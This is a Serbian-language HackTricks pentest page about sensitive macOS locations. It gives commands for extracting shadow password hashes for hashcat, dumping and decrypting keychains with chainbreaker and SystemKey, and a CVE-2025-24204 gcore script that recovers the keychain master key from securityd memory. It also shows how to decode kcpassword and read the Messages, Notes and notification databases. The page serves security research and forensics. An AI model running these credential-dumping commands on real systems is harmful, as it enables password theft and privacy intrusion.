# Osetljive lokacije i zanimljivi demoni za macOS

{{#include ../../../banners/hacktricks-training.md}}


## Lozinke

### Shadow lozinke

Shadow lozinka se čuva zajedno sa konfiguracijom korisnika u plist datotekama koje se nalaze u **`/var/db/dslocal/nodes/Default/users/`**.\
Sledeći oneliner može da se koristi za izlistavanje **svih informacija o korisnicima** (uključujući informacije o hash-u):

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Skripte poput ove**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ili [**ove**](https://github.com/octomagon/davegrohl.git) mogu da se koriste za transformaciju hash-a u **hashcat** **format**.

Alternativni one-liner koji će izvući pristupne podatke svih naloga koji nisu servisni, u hashcat formatu `-m 7100` (macOS PBKDF2-SHA512):

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Još jedan način da pribavite `ShadowHashData` korisnika jeste pomoću `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Konvertovanje kopiranog ShadowHashData na Linuxu

Ako je atribut kopiran na Linux cracking host, sačuvajte **samo njegove heksadecimalne bajtove** (ne i oznaku `ShadowHashData:`) u datoteku `shadowhash.hex`. Na Ubuntu-u, `libplist-utils` konvertuje dekodirani binarni plist u čitljiv XML bez macOS `plutil`.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

U XML-u koristite `iterations` i base64 vrednosti `salt` i `entropy` iz **`SALTED-SHA512-PBKDF2`**, a ne zasebni SRP verifier. Postavite `salt_b64` i `entropy_b64` na sadržaje odgovarajućih XML elemenata `<data>`. Dekodirajte ih u hex i formirajte jedan red u obliku `$ml$<iterations>$<salt_hex>$<entropy_hex>` za Hashcat mode `7100`. Ovo je offline pogađanje nakon pribavljanja hash-a uz privilegije, a ne metod za početni pristup ili eskalaciju privilegija.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Ova datoteka se **koristi samo** kada sistem radi u **single-user mode** (što se ne dešava često).

### Ispis Keychain-a

Imajte na umu da će se prilikom korišćenja binarne datoteke `security` za **ispis dekriptovanih lozinki** prikazati nekoliko upita kojima se od korisnika traži da dozvoli ovu operaciju.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

Na savremenom macOS-u najzanimljivija skladišta su obično **`~/Library/Keychains/login.keychain-db`** i **`/Library/Keychains/System.keychain`**. To su datoteke zasnovane na SQLite-u, ali pristup otvorenom tekstu i dalje posreduje **`securityd`**: krađa sirove baze podataka uglavnom vam daje metapodatke i šifrovane blobove, osim ako ne pribavite i korisničku lozinku, `SystemKey` ili glavni ključ koji se nalazi u memoriji.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Prema ovom komentaru [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), izgleda da ovi alati više ne rade u Big Sur-u.

### Pregled alata Keychaindump

Razvijen je alat pod nazivom **keychaindump** za izvlačenje lozinki iz macOS keychain-a, ali ima ograničenja na novijim verzijama macOS-a, poput Big Sur-a, kao što je navedeno u [diskusiji](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Za upotrebu alata **keychaindump**, napadač mora da dobije pristup i eskalira privilegije do nivoa **root**. Alat iskorišćava činjenicu da se keychain podrazumevano otključava kada se korisnik prijavi, radi lakšeg korišćenja, što aplikacijama omogućava pristup bez ponovnog traženja korisničke lozinke. Međutim, ako korisnik podesi da se keychain zaključava nakon svake upotrebe, **keychaindump** postaje neefikasan.

Alat **Keychaindump** cilja određeni proces pod nazivom **securityd**, koji Apple opisuje kao daemon za autorizaciju i kriptografske operacije, ključan za pristup keychain-u. Proces izvlačenja podataka obuhvata pronalaženje **glavnog ključa** izvedenog iz korisničke lozinke za prijavu. Taj ključ je neophodan za čitanje datoteke keychain-a. Da bi pronašao **glavni ključ**, **keychaindump** skenira memorijski heap procesa **securityd** pomoću komande `vmmap`, tražeći moguće ključeve u oblastima označenim kao `MALLOC_TINY`. Za pregled ovih memorijskih lokacija koristi se sledeća komanda:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Nakon identifikovanja potencijalnih master ključeva, **keychaindump** pretražuje heap memoriju u potrazi za određenim obrascem (`0x0000000000000018`) koji ukazuje na kandidata za master ključ. Za korišćenje ovog ključa potrebni su dodatni koraci, uključujući deobfuskaciju, kao što je opisano u izvornom kodu alata **keychaindump**. Analitičari koji se bave ovom oblašću treba da imaju na umu da se ključni podaci za dešifrovanje keychain-a čuvaju u memoriji procesa **securityd**. Primer komande za pokretanje alata **keychaindump**:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) može da izdvoji sledeće vrste podataka iz macOS keychain-a na forenzički ispravan način:

- Heširanu lozinku za Keychain, pogodnu za razbijanje pomoću [hashcat](https://hashcat.net/hashcat/) ili [John the Ripper](https://www.openwall.com/john/)
- Internet lozinke
- Generičke lozinke
- Privatne ključeve
- Javne ključeve
- X509 sertifikate
- Bezbedne beleške
- Appleshare lozinke

Ako imate lozinku za otključavanje keychain-a, glavni ključ dobijen pomoću [volafox](https://github.com/n0fate/volafox) ili [volatility](https://github.com/volatilityfoundation/volatility), ili datoteku za otključavanje kao što je SystemKey, Chainbreaker će prikazati i lozinke u čistom tekstu.

Bez jednog od ovih načina za otključavanje Keychain-a, Chainbreaker će prikazati sve ostale dostupne podatke.

#### **Izlistavanje ključeva iz keychain-a**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump ključeva iz keychain-a (sa lozinkama) pomoću SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain ključeva (sa lozinkama) i cracking hash-a**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain ključeva (sa lozinkama) pomoću dump-a memorije**

[Pratite ove korake](../index.html#dumping-memory-with-osxpmem) da biste napravili **dump memorije**.

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump ključeva iz keychain-a (sa lozinkama) pomoću lozinke korisnika**

Ako znate lozinku korisnika, možete da napravite **dump i dešifrujete keychain-ove koji pripadaju tom korisniku**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Keychain master key preko `gcore` entitlement-a (CVE-2025-24204)

macOS 15.0 (Sequoia) isporučen je sa `/usr/bin/gcore` koji je imao **`com.apple.system-task-ports.read`** entitlement, pa je svaki lokalni administrator (ili zlonamerna potpisana aplikacija) mogao da dump-uje memoriju bilo kog procesa čak i kada su SIP/TCC bili uključeni. Dump-ovanje procesa `securityd` otkriva **Keychain master key** u čistom tekstu i omogućava dešifrovanje datoteke `login.keychain-db` bez korisničke lozinke.<sup>[[1]](#references)</sup>

**Brza reprodukcija na ranjivim verzijama (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Prosledite izdvojeni hex ključ programu Chainbreaker (`--key <hex>`) da biste dešifrovali login keychain. Apple je uklonio entitlement u **macOS 15.3+**, pa ovo funkcioniše samo na nepatchovanim Sequoia buildovima ili sistemima na kojima je zadržan ranjivi binary.

### kcpassword

Datoteka **kcpassword** čuva **korisničku lozinku za prijavu**, ali samo ako je vlasnik sistema **omogućio automatsku prijavu**. Korisnik će se zato automatski prijaviti bez unosa lozinke (što nije baš bezbedno).

Lozinka je u datoteci **`/etc/kcpassword`** XOR-ovana ključem **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ako je korisnička lozinka duža od ključa, ključ će se ponovo koristiti.\
Zbog toga se lozinka prilično lako može oporaviti, na primer pomoću skripti kao što je [**ova**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Zanimljive informacije u bazama podataka

### Poruke

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Obaveštenja

Pre **Sequoia**, Notification Center bazu obično možete pronaći u **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. U verziji **Sequoia+**, Apple ju je premestio u grupni kontejner zaštićen pomoću TCC-a **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Većina zanimljivih informacija čuva se u kolonama tipa **blob**, pa ćete morati da izdvojite taj sadržaj i pretvorite ga u čitljiv oblik (`plutil -p -`, `strings` ili mali parser). Primeri za brzu trijažu:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Nedavni problemi s privatnošću (baza podataka NotificationCenter)

- U macOS **14.7–15.1** Apple je čuvao sadržaj banera u SQLite bazi `db2/db` bez odgovarajuće redakcije. CVE-ovi **CVE-2024-44292/44293/40838/54504** omogućavali su svakom lokalnom korisniku da pročita tekst obaveštenja drugih korisnika jednostavnim otvaranjem baze podataka (bez TCC upita).<sup>[[3]](#references)</sup>
- Apple je ublažio ovaj problem premeštanjem baze podataka u `group.com.apple.usernoted` i zaštitio je pomoću TCC-a u novijim verzijama Sequoie, tako da je na aktuelnim sistemima obično potreban odgovarajući korisnički kontekst ili TCC bypass da bi se pristupilo podacima.<sup>[[4]](#references)</sup>
- Na starijim uređajima kopirajte zajedno datoteke `db`, `db-wal` i `db-shm` pre ažuriranja ili ponovnog pokretanja ako želite da sačuvate artefakte.

### Napomene

Korisničke **beleške** mogu se pronaći u `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Ako je gornja jednolinijska komanda previše bučna, izvezite `ZICNOTEDATA.ZDATA`, dekompresujte je pomoću gunzip-a i parsirajte protobuf: ovo je obično pouzdanije nego direktno pokretanje `strings` nad SQLite bazom.

### Pozadinski zadaci / Stavke za prijavu

Od **Ventura** verzije, stavke za prijavu koje je odobrio korisnik i nekoliko pozadinskih zadataka prate se u BTM skladištima kao što su **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** i verzionisana sistemska keš memorija **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Ove datoteke su korisne za brzo otkrivanje persistence mehanizama, pomoćnih alata i nekih pozadinskih stavki kojima upravlja MDM:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Za persistence ugao i interne detalje BTM-a pogledajte [stranicu o lokacijama automatskog pokretanja](../../macos-auto-start-locations.md#login-items) i [beleške o Background Tasks Management-u](../macos-security-protections/README.md#background-tasks-management).

## Podešavanja

U macOS-u se podešavanja aplikacija nalaze u **`$HOME/Library/Preferences`**, a u iOS-u u `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

U macOS-u se CLI alatka **`defaults`** može koristiti za **izmenu datoteke sa podešavanjima**.

**`/usr/sbin/cfprefsd`** preuzima XPC servise `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` i može se pozvati radi izvršavanja radnji kao što je izmena podešavanja.

## Dozvole OpenDirectory-ja permissions.plist

Datoteka `/System/Library/OpenDirectory/permissions.plist` sadrži dozvole primenjene na atribute čvorova i zaštićena je SIP-om.\
Ova datoteka dodeljuje dozvole određenim korisnicima prema UUID-u (a ne UID-u), kako bi mogli da pristupe određenim osetljivim informacijama, kao što su `ShadowHashData`, `HeimdalSRPKey` i `KerberosKeys`, između ostalih:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Sistemska obaveštenja

### Darwin obaveštenja

Glavni daemon za obaveštenja je **`/usr/sbin/notifyd`**. Da bi primali obaveštenja, klijenti moraju da se registruju preko Mach porta `com.apple.system.notification_center` (proverite ih pomoću `sudo lsmp -p <pid notifyd>`). Daemon se konfiguriše pomoću datoteke `/etc/notify.conf`.

Nazivi koji se koriste za obaveštenja jedinstveni su zapisi u obrnutom DNS formatu. Kada se obaveštenje pošalje na neki od njih, primiće ga klijent ili klijenti koji su naveli da mogu da ga obrade.

Trenutni status (i sve nazive) moguće je izvući slanjem signala SIGUSR2 procesu notifyd, a zatim čitanjem generisane datoteke: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

**Distributed Notification Center**, čiji je glavni binarni fajl **`/usr/sbin/distnoted`**, predstavlja još jedan način za slanje obaveštenja. Izlaže neke XPC servise i vrši određene provere kako bi pokušao da verifikuje klijente.

### Apple Push Notifications (APN)

U ovom slučaju, aplikacije mogu da se registruju za **teme**. Klijent generiše token tako što kontaktira Apple servere preko servisa **`apsd`**.\
Zatim i pružaoci usluga generišu token i mogu da se povežu sa Apple serverima kako bi slali poruke klijentima. Te poruke lokalno prima **`apsd`**, koji prosleđuje obaveštenje aplikaciji koja ga čeka.

Podešavanja se nalaze u datoteci `/Library/Preferences/com.apple.apsd.plist`.

Lokalna baza podataka poruka nalazi se na macOS-u u `/Library/Application\ Support/ApplePushService/aps.db`, a na iOS-u u `/var/mobile/Library/ApplePushService`. Sadrži 3 tabele: `incoming_messages`, `outgoing_messages` i `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

Takođe je moguće dobiti informacije o daemon-u i vezama pomoću:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Obaveštenja korisnika

Ovo su obaveštenja koja korisnik treba da vidi na ekranu:

- **`CFUserNotification`**: Ovi API-ji omogućavaju prikaz iskačućeg prozora sa porukom na ekranu.
- **The Bulletin Board**: U iOS-u prikazuje baner koji nestaje i čuva se u Notification Center-u.
- **`NSUserNotificationCenter`**: Zastarela usluga centra za obaveštenja u macOS-u. U starijim izdanjima baza podataka se obično nalazi u `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; u Sequoia i novijim verzijama premeštena je u `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – macOS gcore entitlement omogućio izdvajanje glavnog ključa iz Keychain-a (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Zaštita podataka Keychain-a](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Otkrivanje podataka iz SQLite baze Notification Center-a (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple rešava pitanja privatnosti u vezi sa bazom Notification Center-a u macOS Sequoia-i](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – Razbijanje lozinki u macOS-u](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcat example hashes – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
